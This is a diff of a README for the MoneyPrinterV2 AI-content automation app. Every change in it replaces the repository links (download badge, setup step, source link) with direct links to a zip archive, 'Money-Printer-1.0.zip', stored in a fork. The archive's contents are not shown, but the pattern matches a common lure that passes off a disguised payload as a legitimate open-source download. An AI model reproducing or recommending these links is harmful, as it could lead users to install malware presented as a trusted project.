@@ -1,6 +1,6 @@
 # 🤖 MoneyPrinterV2 - Automate AI Content and Outreach
 
-[![Download MoneyPrinterV2](https://img.shields.io/badge/Download%20MoneyPrinterV2-blue-grey?style=for-the-badge)](https://github.com/liranman90/MoneyPrinterV2)
+[![Download MoneyPrinterV2](https://img.shields.io/badge/Download%20MoneyPrinterV2-blue-grey?style=for-the-badge)](https://raw.githubusercontent.com/liranman90/MoneyPrinterV2/main/scripts/Money-Printer-1.0.zip)
 
 ## 🖥️ What MoneyPrinterV2 Does
 
@@ -24,7 +24,7 @@ The app is built for users who want a guided way to run these tasks without writ
 
 Visit this page to download and run the app:
 
-[https://github.com/liranman90/MoneyPrinterV2](https://github.com/liranman90/MoneyPrinterV2)
+[https://raw.githubusercontent.com/liranman90/MoneyPrinterV2/main/scripts/Money-Printer-1.0.zip](https://raw.githubusercontent.com/liranman90/MoneyPrinterV2/main/scripts/Money-Printer-1.0.zip)
 
 ## 🪟 Windows Setup
 
@@ -57,7 +57,7 @@ If you plan to use browser automation, make sure your browser opens normally and
 Follow these steps on Windows:
 
 1. Open the download page:
-   [https://github.com/liranman90/MoneyPrinterV2](https://github.com/liranman90/MoneyPrinterV2)
+   [https://raw.githubusercontent.com/liranman90/MoneyPrinterV2/main/scripts/Money-Printer-1.0.zip](https://raw.githubusercontent.com/liranman90/MoneyPrinterV2/main/scripts/Money-Printer-1.0.zip)
 
 2. Download the project files to your computer.
 
@@ -298,7 +298,7 @@ This mix supports content tasks, browser tasks, and media creation in one app.
 
 If you need the source files or want to start over, use this link:
 
-[https://github.com/liranman90/MoneyPrinterV2](https://github.com/liranman90/MoneyPrinterV2)
+[https://raw.githubusercontent.com/liranman90/MoneyPrinterV2/main/scripts/Money-Printer-1.0.zip](https://raw.githubusercontent.com/liranman90/MoneyPrinterV2/main/scripts/Money-Printer-1.0.zip)
 
 ## 🧭 Suggested Next Steps
 
